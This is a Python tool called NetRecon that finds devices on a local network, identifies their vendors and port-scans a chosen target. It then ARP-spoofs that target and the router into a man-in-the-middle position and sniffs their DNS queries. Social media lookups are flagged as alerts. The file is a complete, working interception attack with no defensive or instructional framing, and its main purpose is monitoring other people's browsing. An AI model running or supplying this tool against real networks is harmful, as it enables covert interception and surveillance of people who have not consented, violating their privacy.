import ipaddress
import platform
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sniff, srp

# =================================================================
#                         HELPER FUNCTIONS
# =================================================================


def get_local_ip_and_subnet():
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    parts = local_ip.split(".")
    subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return local_ip, subnet
  except Exception:
    return "192.168.1.50", "192.168.1.0/24"


def get_gateway_ip(local_ip):
  parts = local_ip.split(".")
  return f"{parts[0]}.{parts[1]}.{parts[2]}.1"


def get_mac(ip):
  try:
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False
    )
    for _, rcv in ans:
      return rcv[Ether].src
  except Exception:
    return None


# Cihazın MAC adresinden markasını/üreticisini bulma fonksiyonu
def get_device_vendor(mac):
  if not mac:
    return "Unknown Device"
  try:
    # Scapy'nin dahili MAC üretici veritabanını kullanıyoruz
    from scapy.data import MANUFDB

    # MAC adresinin ilk 3 parçasını (OUI) alıyoruz (örn: '12:34:56')
    oui = ":".join(mac.split(":")[:3]).upper()
    return MANUFDB._manufdb.get(oui, "Generic / Unknown Vendor")
  except Exception:
    return "Unknown Vendor"


def enable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("1")
    print("[+] IP forwarding enabled successfully.")
  except Exception as e:
    print(f"[-] Warning: Could not enable IP forwarding automatically: {e}")


def disable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("0")
  except Exception:
    pass


# =================================================================
#                     ARP SPOOFING (MITM) ENGINE
# =================================================================


def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
  print(
      f"[*] ARP Spoofing active: Target ({target_ip}) <---> Gateway"
      f" ({gateway_ip})"
  )
  while not stop_event.is_set():
    send(
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
        verbose=False,
    )
    send(
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
        verbose=False,
    )
    time.sleep(2)


def restore_network(target_ip, target_mac, gateway_ip, gateway_mac):
  print("\n[*] Restoring network ARP tables...")
  send(
      ARP(
          op=2,
          pdst=target_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=gateway_ip,
          hwsrc=gateway_mac,
      ),
      count=5,
      verbose=False,
  )
  send(
      ARP(
          op=2,
          pdst=gateway_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=target_ip,
          hwsrc=target_mac,
      ),
      count=5,
      verbose=False,
  )
  print("[+] Network restored.")


# =================================================================
#                        HOST & PORT SCANNER
# =================================================================


def ping_host(ip):
  param = "-n" if platform.system().lower() == "windows" else "-c"
  command = ["ping", param, "1", "-W", "1", str(ip)]
  try:
    if subprocess.run(
        command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    ).returncode == 0:
      return str(ip)
  except Exception:
    pass
  return None


def scan_network(subnet):
  print(
      "\n================================================================="
  )
  print("                  ADVANCED HOST DISCOVERY                        ")
  print(
      "================================================================="
  )
  try:
    net = ipaddress.ip_network(subnet, strict=False)
  except ValueError as e:
    print(f"[-] Invalid subnet: {e}")
    return []

  active_hosts = []
  print(f"[*] Scanning {subnet} for active devices...")

  with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(ping_host, net.hosts())
    for ip in results:
      if ip:
        # Cihaz bulunduğunda MAC adresini ve markasını da hızlıca gösterelim
        mac = get_mac(ip)
        vendor = get_device_vendor(mac)
        print(f"[+] Active Host Discovered: {ip} ---> Vendor: {vendor}")
        active_hosts.append(ip)

  print(f"==================================================")
  print(f"[+] Scan Completed. Total Active Hosts: {len(active_hosts)}")
  return active_hosts


def scan_ports_for_target(target_ip):
  print(
      "\n------------------------------------------------------------------"
  )
  print(f"[*] Quick Port Scan on Target: {target_ip}")
  common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 8080]
  open_ports = []

  def check_port(port):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(0.5)
      result = s.connect_ex((target_ip, port))
      s.close()
      if result == 0:
        return port
    except Exception:
      pass
    return None

  with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_port, common_ports)
    for p in results:
      if p:
        print(f"    [+] Open Port Discovered: {p}")
        open_ports.append(p)

  if not open_ports:
    print("    [-] No common open ports found or firewall blocking.")
  print(
      "------------------------------------------------------------------"
  )


# =================================================================
#                      DNS PACKET HANDLER (Sosyal Medya Dedektörü)
# =================================================================


def dns_callback(packet):
  if packet.haslayer(DNS) and packet.haslayer(DNSQR):
    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").lower()
    src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"

    social_keywords = [
        "instagram",
        "cdninstagram",
        "fbcdn",
        "facebook",
        "twitter",
        "tiktok",
        "whatsapp",
    ]
    is_social = any(keyword in qname for keyword in social_keywords)

    # Sosyal medya ise kırmızı renkli özel uyarı, değilse normal DNS akışı
    if is_social:
      print(
          f"\033[91m[SOCIAL MEDIA ALERT] Source: {src_ip} ---> Requested"
          f" Domain: {qname}\033[0m"
      )
    else:
      print(f"[DNS QUERY] Source: {src_ip} ---> Requested Domain: {qname}")


# =================================================================
#                            MAIN FLOW
# =================================================================


def main():
  print(
      "================================================================="
  )
  print("                 NetRecon v3.5 (Linux Edition)                   ")
  print("      Ultimate Network Recon, Brand Sniffer & Social Monitor     ")
  print(
      "================================================================="
  )

  interface = input(
      "[*] Enter interface name to use (e.g., wlan0, eth0) or press enter for"
      " default: "
  ).strip()
  if not interface:
    interface = None

  auto_ip, auto_subnet = get_local_ip_and_subnet()
  print("\n------------------------------------------------------------------")
  print("SUBNET SELECTION:")
  print(f"1. Auto-detect (Recommended: {auto_subnet})")
  print("2. Enter manual subnet (e.g., 192.168.2.0/24)")
  print("------------------------------------------------------------------")

  subnet_choice = input("[*] Enter choice (1 or 2): ").strip()
  if subnet_choice == "2":
    subnet_input = input(
        "[*] Enter target subnet (e.g., 192.168.1.0/24): "
    ).strip()
  else:
    subnet_input = auto_subnet
    print(f"[*] Auto-selected subnet: {subnet_input}")

  while True:
    active_hosts = scan_network(subnet_input)
    if not active_hosts:
      print("[-] No active hosts found on the network.")
      break

    print("\n------------------------------------------------------------------")
    print("DNS SNIFFER MODES:")
    print("1. Target a specific device (With ARP Spoofing / MITM)")
    print("2. Sniff ALL network devices (Universal Mode / MITM)")
    print("------------------------------------------------------------------")

    mode = input("[*] Choose sniffer mode (1 or 2): ").strip()

    gateway_ip = get_gateway_ip(auto_ip)
    target_ip = None

    if mode == "1":
      target_ip = input(
          "[*] Enter target IP to sniff (e.g., 192.168.1.55): "
      ).strip()
    elif mode == "2":
      print(
          "[*] Universal mode selected. Please select a target device to spoof"
          " and intercept:"
      )
      for idx, host in enumerate(active_hosts):
        if host != gateway_ip:
          # Listede cihazların markalarını da gösterelim ki kim olduğu anlaşılsın
          m_mac = get_mac(host)
          m_vendor = get_device_vendor(m_mac)
          print(f"    {idx}. {host} ({m_vendor})")
      try:
        choice = int(
            input("[*] Enter the number of the target device to intercept: ")
        )
        target_ip = active_hosts[choice]
      except (ValueError, IndexError):
        print("[-] Invalid selection. Returning to menu...")
        continue
    else:
      print("[-] Invalid mode selected.")
      continue

    # Hedef seçildikten sonra marka/model bilgisini yazdıralım
    target_mac = get_mac(target_ip)
    target_vendor = get_device_vendor(target_mac)
    print(
        f"\n[+] Target Identified -> IP: {target_ip} | Brand/Vendor:"
        f" {target_vendor}"
    )

    scan_choice = input(
        f"[*] Do you want to run a quick port scan on target {target_ip}? (y/n):"
        " "
    ).strip().lower()
    if scan_choice == "y":
      scan_ports_for_target(target_ip)

    print(
        "\n------------------------------------------------------------------"
    )
    print("SNIFFING TERMINATION CRITERIA:")
    print("1. Stop after specific timeout (e.g., 30 seconds)")
    print("2. Stop after specific DNS query count (e.g., 10 packets)")
    print("3. Unlimited (Run until manual interruption - Ctrl+C)")
    print(
        "------------------------------------------------------------------"
    )
    limit_choice = input("[*] Enter choice (1, 2, or 3): ").strip()

    sniff_timeout = None
    sniff_count = 0

    if limit_choice == "1":
      try:
        sniff_timeout = int(
            input("[*] Enter timeout in seconds (e.g., 20): ").strip()
        )
      except ValueError:
        sniff_timeout = 30
    elif limit_choice == "2":
      try:
        sniff_count = int(
            input(
                "[*] Enter target DNS query packet count limit (e.g., 10): "
            ).strip()
        )
      except ValueError:
        sniff_count = 10

    print(f"\n[*] Target selected for interception: {target_ip}")
    print(f"[*] Gateway (Router) IP: {gateway_ip}")

    print("[*] Resolving MAC addresses...")
    gateway_mac = get_mac(gateway_ip)

    while not target_mac:
      try:
        target_mac = get_mac(target_ip)
        if not target_mac:
          print(
              f"[-] Warning: Target {target_ip} did not respond. It might be"
              " offline."
          )
          target_ip = input(
              "[*] Please enter a different active target IP: "
          ).strip()
          target_mac = get_mac(target_ip)
      except Exception as e:
        print(f"[-] Error occurred: {e}")
        target_ip = input("[*] Please enter a valid target IP: ").strip()

    if not gateway_mac:
      print(
          "[-] Error: Could not resolve MAC address for gateway (Router)."
          " Skipping this round."
      )
      continue

    enable_ip_forwarding()

    stop_event = threading.Event()
    spoof_thread = threading.Thread(
        target=arp_spoof,
        args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event),
    )
    spoof_thread.daemon = True
    spoof_thread.start()

    print(
        "\n================================================================="
    )
    print(
        f"[*] Listening on interface: {interface if interface else 'default'}"
    )
    print(
        "[*] MITM DNS SNIFFING ACTIVE (Social Media & Traffic Interception)"
    )
    if sniff_timeout:
      print(f"[*] Timeout enabled: will stop after {sniff_timeout} seconds.")
    elif sniff_count > 0:
      print(
          f"[*] Packet limit enabled: will stop after {sniff_count} queries."
      )
    else:
      print("[*] Unlimited mode active. Press CTRL+C to stop.")
    print(
        "================================================================="
    )

    try:
      sniff(
          iface=interface,
          filter="udp port 53",
          prn=dns_callback,
          store=0,
          timeout=sniff_timeout,
          count=sniff_count,
      )
      print(
          "\n[+] Sniffing criteria reached. Restoring network and returning"
          " to menu..."
      )
    except KeyboardInterrupt:
      print("\n[*] Stopping sniffer by user...")

    stop_event.set()
    spoof_thread.join()
    restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
    disable_ip_forwarding()
    print("[+] Network restored. Restarting menu...\n")


if __name__ == "__main__":
  try:
    main()
  except KeyboardInterrupt:
    print("\n[+] Program closed completely by user.")
    sys.exit(0)
